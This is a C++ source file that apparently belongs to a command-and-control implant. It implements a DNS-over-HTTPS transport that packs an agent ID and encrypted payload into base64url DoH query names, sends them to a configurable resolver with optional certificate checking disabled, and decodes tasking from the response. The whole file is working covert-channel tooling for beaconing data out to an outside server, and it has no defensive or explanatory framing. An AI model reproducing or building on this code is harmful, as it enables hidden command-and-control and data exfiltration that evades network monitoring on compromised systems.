#include "DohTransport.h"
#include "core/Base64.h"
#include "core/Transport.h"

#include <algorithm>
#include <string>

namespace tx {

namespace {

std::string b64url(std::string_view s) {
    auto b = b64::encode(s);
    for (auto& c : b) {
        if (c == '+') c = '-';
        else if (c == '/') c = '_';
        else if (c == '=') c = '\0';
    }
    b.erase(std::remove(b.begin(), b.end(), '\0'), b.end());
    return b;
}

std::string unb64url(std::string_view s) {
    std::string b(s);
    for (auto& c : b) {
        if (c == '-') c = '+';
        else if (c == '_') c = '/';
    }
    while (b.size() % 4) b.push_back('=');
    return b64::decode(b);
}

} // namespace

bool DohTransport::send(std::string_view path, std::string_view body,
                        std::string_view agent_id, Reply& out) {
    (void)path; // DoH listener only carries agent_id:enc (see c2/doh.py)
    if (agent_id.empty()) { out.ok = false; return false; }

    // Wire format must match server: base64url(agent_id + ":" + enc_payload)
    std::string payload = std::string(agent_id) + ":" + std::string(body);
    std::string enc = b64url(payload);
    if (enc.size() > 240) { out.ok = false; return false; }

    std::string q = resolver_ + "?name=" + enc + "&type=" + type_;
    auto r = transport::https_get(q, ignore_cert_);
    if (!r.ok) { out.ok = false; return false; }

    auto pos = r.body.find("\"data\":\"");
    if (pos == std::string::npos) { out.ok = false; return false; }
    pos += 8;
    auto end = r.body.find('"', pos);
    if (end == std::string::npos) { out.ok = false; return false; }
    out.body = unb64url(r.body.substr(pos, end - pos));
    out.ok = true;
    return true;
}

} // namespace tx
